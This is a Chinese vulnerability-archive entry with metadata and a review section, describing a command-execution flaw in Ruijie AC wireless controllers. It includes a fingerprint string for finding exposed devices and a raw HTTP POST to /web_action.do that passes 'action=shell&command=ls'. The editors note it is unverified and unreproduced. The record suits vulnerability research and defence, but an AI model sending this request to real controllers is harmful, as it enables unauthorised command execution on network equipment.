---
source: "wy876 漏洞文库"
id: "vw-7a4bf3cb626e7b0bcd0c27dc"
entity_id: "ve-7a4bf3cb626e7b0bcd0c27dc"
schema_version: "1"
title: "锐捷AC无线控制器存在命令执行漏洞"
product: "Ruijie AC无线控制器"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未给认证/型号/固件；请求无Cookie"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7AC%E6%97%A0%E7%BA%BF%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fivwdfbv0bacamon"
source_status: "recorded"
---

# 锐捷AC无线控制器存在命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie AC无线控制器
- 本文讨论：web_action.do action=shell命令调用
- 版本、权限与配置前提：未给认证/型号/固件；请求无Cookie
- 资料类型：单请求PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅ls请求无响应、源码或鉴权条件，不能断言所有AC未认证任意命令执行
- 测绘语法未注明Hunter/FOFA；无修复/公告
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- Web接口是否预期管理功能及未授权可达待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷AC无线控制器存在命令执行漏洞，攻击者可通过该漏洞执行任意命令</font>  
**二、影响版本**

锐捷AC无线控制器

**三、资产测绘**

```plain
web.body="简网络，玩智分，无线移动体验 "
```

●登录


**四、漏洞复现**

```http
POST /web_action.do HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

action=shell&command=ls
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fivwdfbv0bacamon>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
